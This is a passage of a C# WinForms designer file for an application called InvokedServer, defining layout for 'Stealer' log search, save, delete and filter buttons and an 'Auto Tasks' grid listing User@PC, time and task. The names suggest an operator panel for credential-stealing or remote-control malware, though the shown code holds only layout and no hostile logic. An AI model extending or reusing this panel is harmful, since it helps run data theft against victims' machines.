            this.StealerSearchClear.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StealerSearchClear.ForeColor = System.Drawing.Color.White;
            this.StealerSearchClear.Location = new System.Drawing.Point(213, 0);
            this.StealerSearchClear.Name = "StealerSearchClear";
            this.StealerSearchClear.Size = new System.Drawing.Size(16, 16);
            this.StealerSearchClear.TabIndex = 9;
            this.StealerSearchClear.Click += new System.EventHandler(this.StealerSearchClear_Click);
            // 
            // StealerSearchTextbox
            // 
            this.StealerSearchTextbox.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerSearchTextbox.BorderThickness = 0;
            this.StealerSearchTextbox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.StealerSearchTextbox.DefaultText = "";
            this.StealerSearchTextbox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.StealerSearchTextbox.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.StealerSearchTextbox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.StealerSearchTextbox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.StealerSearchTextbox.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerSearchTextbox.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerSearchTextbox.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.StealerSearchTextbox.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.StealerSearchTextbox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(192)))));
            this.StealerSearchTextbox.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.StealerSearchTextbox.Location = new System.Drawing.Point(60, 0);
            this.StealerSearchTextbox.Name = "StealerSearchTextbox";
            this.StealerSearchTextbox.PlaceholderText = "[Enter Text Here]";
            this.StealerSearchTextbox.SelectedText = "";
            this.StealerSearchTextbox.Size = new System.Drawing.Size(169, 16);
            this.StealerSearchTextbox.TabIndex = 8;
            // 
            // StealerSearchbarLabel
            // 
            this.StealerSearchbarLabel.AutoSize = true;
            this.StealerSearchbarLabel.Dock = System.Windows.Forms.DockStyle.Left;
            this.StealerSearchbarLabel.Location = new System.Drawing.Point(16, 0);
            this.StealerSearchbarLabel.Name = "StealerSearchbarLabel";
            this.StealerSearchbarLabel.Size = new System.Drawing.Size(44, 13);
            this.StealerSearchbarLabel.TabIndex = 7;
            this.StealerSearchbarLabel.Text = "Search:";
            // 
            // StealerSearchBtn
            // 
            this.StealerSearchBtn.BackColor = System.Drawing.Color.Transparent;
            this.StealerSearchBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.StealerSearchBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StealerSearchBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StealerSearchBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StealerSearchBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StealerSearchBtn.Dock = System.Windows.Forms.DockStyle.Left;
            this.StealerSearchBtn.FillColor = System.Drawing.Color.Transparent;
            this.StealerSearchBtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StealerSearchBtn.ForeColor = System.Drawing.Color.White;
            this.StealerSearchBtn.Location = new System.Drawing.Point(0, 0);
            this.StealerSearchBtn.Name = "StealerSearchBtn";
            this.StealerSearchBtn.Size = new System.Drawing.Size(16, 16);
            this.StealerSearchBtn.TabIndex = 0;
            // 
            // guna2GradientPanel3
            // 
            this.guna2GradientPanel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel3.Controls.Add(this.StealerSaveBtn);
            this.guna2GradientPanel3.Controls.Add(this.StealerCopyBtn);
            this.guna2GradientPanel3.Controls.Add(this.StealerDeleteBtn);
            this.guna2GradientPanel3.Controls.Add(this.StealerDeleteLogsbtn);
            this.guna2GradientPanel3.Controls.Add(this.StealerFilterBtn);
            this.guna2GradientPanel3.Dock = System.Windows.Forms.DockStyle.Right;
            this.guna2GradientPanel3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.guna2GradientPanel3.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(42)))), ((int)(((byte)(58)))));
            this.guna2GradientPanel3.Location = new System.Drawing.Point(93, 0);
            this.guna2GradientPanel3.Name = "guna2GradientPanel3";
            this.guna2GradientPanel3.Size = new System.Drawing.Size(786, 16);
            this.guna2GradientPanel3.TabIndex = 12;
            // 
            // StealerSaveBtn
            // 
            this.StealerSaveBtn.BackColor = System.Drawing.Color.Transparent;
            this.StealerSaveBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.StealerSaveBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StealerSaveBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StealerSaveBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StealerSaveBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StealerSaveBtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.StealerSaveBtn.FillColor = System.Drawing.Color.Transparent;
            this.StealerSaveBtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StealerSaveBtn.ForeColor = System.Drawing.Color.White;
            this.StealerSaveBtn.Location = new System.Drawing.Point(691, 0);
            this.StealerSaveBtn.Name = "StealerSaveBtn";
            this.StealerSaveBtn.Size = new System.Drawing.Size(19, 16);
            this.StealerSaveBtn.TabIndex = 6;
            // 
            // StealerCopyBtn
            // 
            this.StealerCopyBtn.BackColor = System.Drawing.Color.Transparent;
            this.StealerCopyBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.StealerCopyBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StealerCopyBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StealerCopyBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StealerCopyBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StealerCopyBtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.StealerCopyBtn.FillColor = System.Drawing.Color.Transparent;
            this.StealerCopyBtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StealerCopyBtn.ForeColor = System.Drawing.Color.White;
            this.StealerCopyBtn.Location = new System.Drawing.Point(710, 0);
            this.StealerCopyBtn.Name = "StealerCopyBtn";
            this.StealerCopyBtn.Size = new System.Drawing.Size(19, 16);
            this.StealerCopyBtn.TabIndex = 2;
            // 
            // StealerDeleteBtn
            // 
            this.StealerDeleteBtn.BackColor = System.Drawing.Color.Transparent;
            this.StealerDeleteBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.StealerDeleteBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StealerDeleteBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StealerDeleteBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StealerDeleteBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StealerDeleteBtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.StealerDeleteBtn.FillColor = System.Drawing.Color.Transparent;
            this.StealerDeleteBtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StealerDeleteBtn.ForeColor = System.Drawing.Color.White;
            this.StealerDeleteBtn.Location = new System.Drawing.Point(729, 0);
            this.StealerDeleteBtn.Name = "StealerDeleteBtn";
            this.StealerDeleteBtn.Size = new System.Drawing.Size(19, 16);
            this.StealerDeleteBtn.TabIndex = 4;
            // 
            // StealerDeleteLogsbtn
            // 
            this.StealerDeleteLogsbtn.BackColor = System.Drawing.Color.Transparent;
            this.StealerDeleteLogsbtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.StealerDeleteLogsbtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StealerDeleteLogsbtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StealerDeleteLogsbtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StealerDeleteLogsbtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StealerDeleteLogsbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.StealerDeleteLogsbtn.FillColor = System.Drawing.Color.Transparent;
            this.StealerDeleteLogsbtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StealerDeleteLogsbtn.ForeColor = System.Drawing.Color.White;
            this.StealerDeleteLogsbtn.Location = new System.Drawing.Point(748, 0);
            this.StealerDeleteLogsbtn.Name = "StealerDeleteLogsbtn";
            this.StealerDeleteLogsbtn.Size = new System.Drawing.Size(19, 16);
            this.StealerDeleteLogsbtn.TabIndex = 5;
            // 
            // StealerFilterBtn
            // 
            this.StealerFilterBtn.BackColor = System.Drawing.Color.Transparent;
            this.StealerFilterBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.StealerFilterBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StealerFilterBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StealerFilterBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StealerFilterBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StealerFilterBtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.StealerFilterBtn.FillColor = System.Drawing.Color.Transparent;
            this.StealerFilterBtn.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StealerFilterBtn.ForeColor = System.Drawing.Color.White;
            this.StealerFilterBtn.Location = new System.Drawing.Point(767, 0);
            this.StealerFilterBtn.Name = "StealerFilterBtn";
            this.StealerFilterBtn.Size = new System.Drawing.Size(19, 16);
            this.StealerFilterBtn.TabIndex = 1;
            // 
            // AutoTasksPage
            // 
            this.AutoTasksPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.AutoTasksPage.Controls.Add(this.NotiTasksDataGridView);
            this.AutoTasksPage.Controls.Add(this.guna2GradientButton5);
            this.AutoTasksPage.Controls.Add(this.guna2GradientButton4);
            this.AutoTasksPage.Controls.Add(this.guna2GradientButton3);
            this.AutoTasksPage.Controls.Add(this.guna2GradientButton2);
            this.AutoTasksPage.Controls.Add(this.TasksDataGridView);
            this.AutoTasksPage.Flags = 65534;
            this.AutoTasksPage.ImageSmall = global::InvokedServer.Properties.Resources.dashboard;
            this.AutoTasksPage.LastVisibleSet = true;
            this.AutoTasksPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.AutoTasksPage.Name = "AutoTasksPage";
            this.AutoTasksPage.Size = new System.Drawing.Size(879, 396);
            this.AutoTasksPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.AutoTasksPage.Text = "Auto Tasks";
            this.AutoTasksPage.ToolTipTitle = "Page ToolTip";
            this.AutoTasksPage.UniqueName = "98E30264D3A34003CCBBBCE7F69685E5";
            this.AutoTasksPage.Click += new System.EventHandler(this.AutoTasksPage_Click);
            // 
            // NotiTasksDataGridView
            // 
            this.NotiTasksDataGridView.AllowUserToAddRows = false;
            this.NotiTasksDataGridView.AllowUserToDeleteRows = false;
            this.NotiTasksDataGridView.AllowUserToOrderColumns = true;
            this.NotiTasksDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle58.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiTasksDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle58;
            this.NotiTasksDataGridView.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.NotiTasksDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiTasksDataGridView.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.NotiTasksDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle59.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle59.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle59.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle59.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle59.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle59.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle59.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.NotiTasksDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle59;
            this.NotiTasksDataGridView.ColumnHeadersHeight = 20;
            this.NotiTasksDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.User3Col,
            this.TimeCol,
            this.Task2Col});
            dataGridViewCellStyle60.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle60.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle60.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle60.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle60.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle60.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(254)))));
            dataGridViewCellStyle60.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.NotiTasksDataGridView.DefaultCellStyle = dataGridViewCellStyle60;
            this.NotiTasksDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.NotiTasksDataGridView.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiTasksDataGridView.Location = new System.Drawing.Point(0, 218);
            this.NotiTasksDataGridView.Name = "NotiTasksDataGridView";
            this.NotiTasksDataGridView.ReadOnly = true;
            this.NotiTasksDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.NotiTasksDataGridView.RowHeadersVisible = false;
            this.NotiTasksDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.NotiTasksDataGridView.Size = new System.Drawing.Size(879, 178);
            this.NotiTasksDataGridView.TabIndex = 50;
            this.NotiTasksDataGridView.TabStop = false;
            this.NotiTasksDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiTasksDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.NotiTasksDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.NotiTasksDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.NotiTasksDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.NotiTasksDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiTasksDataGridView.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiTasksDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.NotiTasksDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.NotiTasksDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.NotiTasksDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.NotiTasksDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.NotiTasksDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.NotiTasksDataGridView.ThemeStyle.ReadOnly = true;
            this.NotiTasksDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiTasksDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.NotiTasksDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.NotiTasksDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.NotiTasksDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.NotiTasksDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.SteelBlue;
            this.NotiTasksDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // User3Col
            // 
            this.User3Col.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.User3Col.FillWeight = 124.1573F;
            this.User3Col.HeaderText = "User@PC";
            this.User3Col.Name = "User3Col";
            this.User3Col.ReadOnly = true;
            this.User3Col.Width = 150;
            // 
            // TimeCol
            // 
            this.TimeCol.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.TimeCol.FillWeight = 79.48418F;
            this.TimeCol.HeaderText = "Time";
            this.TimeCol.Name = "TimeCol";
            this.TimeCol.ReadOnly = true;
            this.TimeCol.Width = 150;
            // 
            // Task2Col
            // 
            this.Task2Col.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
            this.Task2Col.FillWeight = 0.1834614F;
            this.Task2Col.HeaderText = "Task";
            this.Task2Col.Name = "Task2Col";
            this.Task2Col.ReadOnly = true;
            // 
            // guna2GradientButton5
            // 
            this.guna2GradientButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2GradientButton5.Animated = true;
            this.guna2GradientButton5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton5.BorderRadius = 2;
            this.guna2GradientButton5.BorderThickness = 1;
            this.guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton5.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton5.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton5.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton5.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton5.Image = global::InvokedServer.Properties.Resources.save;
            this.guna2GradientButton5.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton5.Location = new System.Drawing.Point(6, 191);
            this.guna2GradientButton5.Name = "guna2GradientButton5";
            this.guna2GradientButton5.Size = new System.Drawing.Size(82, 23);
            this.guna2GradientButton5.TabIndex = 49;
            this.guna2GradientButton5.Text = "Save";
            this.guna2GradientButton5.Click += new System.EventHandler(this.guna2GradientButton5_Click);
            // 
            // guna2GradientButton4
            // 
            this.guna2GradientButton4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2GradientButton4.Animated = true;
            this.guna2GradientButton4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton4.BorderRadius = 2;
            this.guna2GradientButton4.BorderThickness = 1;
            this.guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton4.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton4.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton4.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton4.Image = global::InvokedServer.Properties.Resources.control_play_blue;
            this.guna2GradientButton4.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton4.Location = new System.Drawing.Point(782, 191);
            this.guna2GradientButton4.Name = "guna2GradientButton4";
            this.guna2GradientButton4.Size = new System.Drawing.Size(90, 23);
            this.guna2GradientButton4.TabIndex = 48;
            this.guna2GradientButton4.Text = "Start";
            this.guna2GradientButton4.Click += new System.EventHandler(this.guna2GradientButton4_Click);
            // 
            // guna2GradientButton3
            // 
            this.guna2GradientButton3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2GradientButton3.Animated = true;
            this.guna2GradientButton3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton3.BorderRadius = 2;
            this.guna2GradientButton3.BorderThickness = 1;
            this.guna2GradientButton3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton3.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton3.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton3.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton3.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton3.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton3.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton3.Image = global::InvokedServer.Properties.Resources.delete;
            this.guna2GradientButton3.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton3.Location = new System.Drawing.Point(219, 191);
            this.guna2GradientButton3.Name = "guna2GradientButton3";
            this.guna2GradientButton3.Size = new System.Drawing.Size(161, 23);
            this.guna2GradientButton3.TabIndex = 39;
            this.guna2GradientButton3.Text = "Delete selected task(s)";
            this.guna2GradientButton3.Click += new System.EventHandler(this.guna2GradientButton3_Click);
            // 
            // guna2GradientButton2
            // 
            this.guna2GradientButton2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2GradientButton2.Animated = true;
            this.guna2GradientButton2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton2.BorderRadius = 2;
            this.guna2GradientButton2.BorderThickness = 1;
            this.guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 8.25F);
